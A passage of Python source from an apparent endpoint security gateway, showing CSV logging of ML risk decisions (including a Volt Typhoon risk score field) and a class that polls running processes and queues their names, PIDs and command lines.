                "timestamp": decision_data.get("timestamp", ""),
                "process": decision_data.get("process", ""),
                "pid": decision_data.get("pid", ""),
                "risk_score": decision_data.get("risk_score", ""),
                "decision": decision_data.get("decision", ""),
                "volt_typhoon_risk_score": volt.get("volt_typhoon_risk_score", ""),
                "ml_risk_score": ml.get("risk_score", "")
            }
        else:
            ml_row = {k: decision_data.get(k, "") for k in ml_fields}

        write_ml_header = not os.path.exists(ml_log_file)
        try:
            with open(ml_log_file, "a", newline='', encoding="utf-8") as f:
                writer = csv.DictWriter(f, fieldnames=ml_fields)
                if write_ml_header:
                    writer.writeheader()
                writer.writerow(ml_row)
        except Exception as e:
            self.logger.error(f"Failed to log ML decision (CSV): {e}")


class ProcessInterceptor:
    def __init__(self):
        self.process_queue = queue.Queue()
        self._seen = set()
        self.running = False

    def start_interception(self):
        self.running = True
        threading.Thread(target=self._poll_processes, daemon=True).start()

    def _poll_processes(self):
        while self.running:
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                if proc.info['pid'] not in self._seen:
                    self._seen.add(proc.info['pid'])
                    cmdline = proc.info.get('cmdline')
                    if not cmdline:
                        cmdline = []
                    self.process_queue.put({
                        'name': proc.info['name'],
                        'pid': proc.info['pid'],
                        'cmdline': ' '.join(cmdline)
                    })
            time.sleep(0.5)  # Poll every 0.5 seconds for faster response

if __name__ == "__main__":
    import asyncio
    gateway = SecurityGateway()
    try:
        asyncio.run(gateway.start_protection())
    except KeyboardInterrupt:
        print("Security Gateway stopped by user.")

